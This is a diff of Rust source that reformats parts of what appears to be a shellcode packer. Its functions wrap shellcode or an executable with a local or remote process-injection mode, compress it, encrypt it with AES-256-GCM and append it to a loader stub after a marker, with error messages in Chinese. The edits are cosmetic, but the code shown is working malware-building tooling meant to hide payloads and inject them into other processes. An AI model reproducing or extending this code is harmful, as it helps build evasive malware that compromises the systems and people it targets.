@@ -1,4 +1,7 @@
-use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
+use aes_gcm::{
+    aead::{Aead, KeyInit},
+    Aes256Gcm, Nonce,
+};
 use rand::{rngs::OsRng, RngCore};
 use std::fs;
 use std::path::{Path, PathBuf};
@@ -46,11 +49,20 @@ pub fn pack_file(input_path: &Path, out_path: &Path) -> Result<(), String> {
     pack_payload(input, out_path)
 }
 
-pub fn pack_shellcode(sc_path: &Path, out_path: &Path, inj_mode: &str, remote_path: Option<&Path>) -> Result<(), String> {
+pub fn pack_shellcode(
+    sc_path: &Path,
+    out_path: &Path,
+    inj_mode: &str,
+    remote_path: Option<&Path>,
+) -> Result<(), String> {
     let sc = fs::read(sc_path).map_err(|e| format!("读取Shellcode失败: {}", e))?;
     let mut payload = Vec::new();
     payload.extend_from_slice(b"SC\0");
-    let mode = if inj_mode.eq_ignore_ascii_case("remote") { 1u8 } else { 0u8 };
+    let mode = if inj_mode.eq_ignore_ascii_case("remote") {
+        1u8
+    } else {
+        0u8
+    };
     payload.push(mode);
     if mode == 1 {
         let p = remote_path.ok_or("远程注入需要提供目标进程路径")?;
@@ -83,7 +95,9 @@ fn pack_payload(payload: Vec<u8>, out_path: &Path) -> Result<(), String> {
     let mut nonce_bytes = [0u8; 12];
     OsRng.fill_bytes(&mut nonce_bytes);
     let nonce = Nonce::from_slice(&nonce_bytes);
-    let ciphertext = cipher.encrypt(nonce, compressed.as_ref()).map_err(|_| "加密失败".to_string())?;
+    let ciphertext = cipher
+        .encrypt(nonce, compressed.as_ref())
+        .map_err(|_| "加密失败".to_string())?;
 
     let mut out = stub;
     out.extend_from_slice(MARKER);
